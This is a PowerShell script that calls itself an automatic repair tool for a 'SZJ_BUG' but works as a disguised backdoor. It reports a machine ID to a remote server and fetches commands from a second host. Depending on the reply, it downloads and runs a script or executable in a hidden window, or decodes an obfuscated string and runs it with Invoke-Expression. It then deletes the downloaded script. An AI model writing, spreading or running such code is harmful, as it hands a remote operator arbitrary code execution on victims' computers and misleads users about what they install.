#This program will run on a regular basis, 
#when the detection of SZJ_BUG on your computer 
#will automatically download and execute the repair process
#
#
#
#
#2015.3-2018.9  auto repair
#
#from ZhiHuiDePianZi Company
#
#OS >= windows 7
#
#
#repair code
#
$client = new-object System.Net.WebClient
$ppid = "psgo"
$instpath = "C:\Update\psgo\";
$uid = "st500lt012-1dg142_s3p2w5rzxxxxs3p2w5rz"
$vsion = "2.0.3"
#
$xingact = "?action=visit.psgo.0&update3=version," + $vsion
$xingbas = "http://raa.qwepoii.org/v4/gtg/" + $uid + $xingact
$xingbas
$client.DownloadString($xingbas)
#
$cloudccc="http://ccc.qwepoii.org/" + $uid + "/" + $ppid+"/" + $vsion 
$cloudccc
$cloudcmdline = $client.DownloadString($cloudccc)
$cloudcmdline
#
$cloudtype = "0"
if($cloudcmdline.Length -gt 3){
  if($cloudcmdline.Substring(0,3) -eq "ppp"){
     $cloudtype = "1"
  }elseif($cloudcmdline.Substring(0,3) -eq "eee"){
     $cloudtype = "2"
  }elseif($cloudcmdline.Substring(0,3) -eq "psc"){
     $cloudtype = "3"
  }
}
#
$strTemp = $instpath + "cd.ps1";
if(TEST-PATH $strTemp){
    Remove-Item $strTemp;
}
$strTemp = $instpath + "cd.exe";
if(TEST-PATH $strTemp){
    Remove-Item $strTemp;
}
#
if($cloudtype -eq "0"){
   exit;
}
#
#
function jiemi($strIn){
   $strOut = ""
   for($i=0;$i -le $strIn.length-1;$i++){
       $uI = [int]$strIn[$i]
       $uI --
       $strOut += [char]$uI
    }
    return $strOut
}
#
#
$cmdlineweb = $cloudcmdline.Substring(4);
if($cloudtype -eq "1"){
   "1111111111"
   $webfilename = "cd.ps1"
   $localcloudfilepath = $instpath +$webfilename
   $client.DownloadFile($cmdlineweb, $localcloudfilepath)
   $psexefilepath = "";
   $powershellfilepath1 = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\powershell.exe";
   $powershellfilepath2 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
   if(TEST-PATH $powershellfilepath1){
        $psexefilepath = $powershellfilepath1;
    }else{
        $psexefilepath = $powershellfilepath2;
    }
   Start-Process -FilePath $psexefilepath -ArgumentList $localcloudfilepath -WindowStyle Hidden;
   Start-Sleep -Seconds 30
   $strTemp = $instpath + "cd.ps1";
   Remove-Item $strTemp;
}elseif($cloudtype -eq "2"){
   "2222222222"
   $webfilename = "cd.exe";
   $localcloudfilepath = $instpath +$webfilename;
   $client.DownloadFile($cmdlineweb, $localcloudfilepath);
   Start-Process -FilePath $localcloudfilepath -WindowStyle Hidden;
}elseif($cloudtype -eq "3"){
   "3333333333"
   $cmdline = jiemi($cmdlineweb)
   $cmdline
   Invoke-Expression -Command $cmdline
}
exit;